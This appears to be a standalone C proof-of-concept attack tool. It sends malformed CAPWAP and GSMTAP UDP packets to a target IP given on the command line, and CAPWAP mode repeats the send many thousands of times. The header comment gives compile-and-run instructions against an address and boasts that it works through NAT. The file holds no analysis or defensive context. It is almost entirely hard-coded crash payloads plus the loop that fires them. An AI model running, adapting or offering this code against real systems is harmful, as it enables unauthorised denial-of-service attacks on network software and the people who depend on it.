/*
    [root@ ~]# uname -a
        FreeBSD  8.2-RELEASE FreeBSD 8.2-RELEASE #0: Fri Feb 18 02:24:46 UTC 2011

    [root@ ~]# gcc eurob00m.c -o eurob00m
    [root@ ~]# ./eurob00m 192.168.2.204 1
    Finished sending.

    1st argument ip to attack
    2nd argument attack type ( 0 or 1 )

    This is udp packets, that should world in a NAT'ed environment :)
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdint.h>

#define INVALID_SOCKET -1
#define SOCKET_ERROR -1

uint8_t capwap[9] =
{
    0xB8,0x00,0x00,0xE4, 0x00,0x00,0x00,0x00, 0x94
};

uint8_t gsmtap[10][39] =
{
    { 0x02,0x5A,0x01,0x00, 0x03,0x67,0x00,0x00, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA },
    { 0x02,0x04,0x01,0x00, 0x03,0x67,0x00,0x00, 0x00,0x00,0x00,0x22, 0x05,0x00,0x00,0x00, 0x15,0x06,0x38,0x00, 0x01,0xF0,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B },
    { 0xB5,0x04,0x01,0x00, 0x03,0x67,0x00,0x00, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA,0xAA, 0xAA,0xAA,0xAA },
    { 0x02,0x04,0x01,0x00, 0x03,0x67,0x00,0x00, 0x00,0x00,0x00,0x22, 0x05,0x00,0x00,0x00, 0x15,0x06,0x21,0x00, 0x01,0xF0,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B },
    { 0x02,0x04,0x01,0x00, 0x03,0x67,0x00,0x00, 0x00,0x00,0x00,0x22, 0x05,0x00,0x00,0x00, 0x15,0x12,0x21,0x00, 0x01,0xF0,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B },
    { 0x02,0x04,0x01,0x37, 0x03,0x67,0x00,0x00, 0x00,0x00,0x00,0x22, 0x05,0x00,0x00,0x00, 0x15,0x06,0x21,0x00, 0x01,0xF0,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B },
    { 0x02,0x04,0x01,0x00, 0x03,0x67,0x00,0x00, 0x00,0x00,0x00,0x22, 0x01,0x00,0x00,0x00, 0x59,0x06,0x1A,0x8F, 0xB2,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x63,0x00,0x00, 0x00,0x00,0x00,0xFF, 0xE5,0x04,0x00 },
    { 0x02,0x04,0x01,0x00, 0x03,0x67,0x00,0x00, 0x00,0x00,0x00,0x22, 0x05,0x00,0x00,0x00, 0x2D,0x06,0x3F,0x03, 0x20,0xE3,0x67,0x00, 0xF3,0x42,0x00,0x00, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B },
    { 0x02,0x04,0x01,0x00, 0x40,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, 0x07,0x00,0x00,0x00, 0x01,0x3F,0x29,0x05, 0x08,0x02,0x00,0x00, 0x00,0x00,0x00,0x00, 0x00,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B },
    { 0x02,0x04,0x01,0x00, 0x03,0x67,0x00,0x00, 0x78,0x72,0x00,0x22, 0x05,0x00,0x00,0x00, 0x15,0x06,0x21,0x00, 0x01,0xF0,0x2B,0x2B, 0x36,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B,0x2B, 0x2B,0x2B,0x2B }
};

int main(int argc, char *argv[])
{
    struct sockaddr_in sin;
    int sd, res, i, j, mode;

    mode = atoi(argv[2]);

    switch( mode )
    {
        case 0: // capwap
            for(j=0; j<4; j++)
            {
                for(i=0; i<0x8000; i++)
                {
                    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                    if (sd == INVALID_SOCKET) {
                        printf("socket failed");
                        return 1;
                    }

                    sin.sin_family = AF_INET;
                    sin.sin_port = htons(5246); // or 5247
                    sin.sin_addr.s_addr = inet_addr(argv[1]);

                    res = sendto(sd, capwap, 9, 0, (struct sockaddr *)&sin, sizeof(sin));
                    if (res == SOCKET_ERROR) {
                        printf("sendto failed");
                        return 1;
                    }

                    close(sd);
                }
            }
            break;

        case 1: // gsmtap
            for(j=0; j<2; j++)
            {
                for(i=0; i<10; i++)
                {
                    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
                    if (sd == INVALID_SOCKET) {
                        printf("socket failed");
                        return 1;
                    }

                    sin.sin_family = AF_INET;
                    sin.sin_port = htons(4729);
                    sin.sin_addr.s_addr = inet_addr(argv[1]);

                    res = sendto(sd, gsmtap[i], 39, 0, (struct sockaddr *)&sin, sizeof(sin));
                    if (res == SOCKET_ERROR) {
                        printf("sendto failed");
                        return 1;
                    }

                    close(sd);
                }
                sleep(1);
            }
            break;
    }

    printf("Finished sending.\n");

    return 0;
}
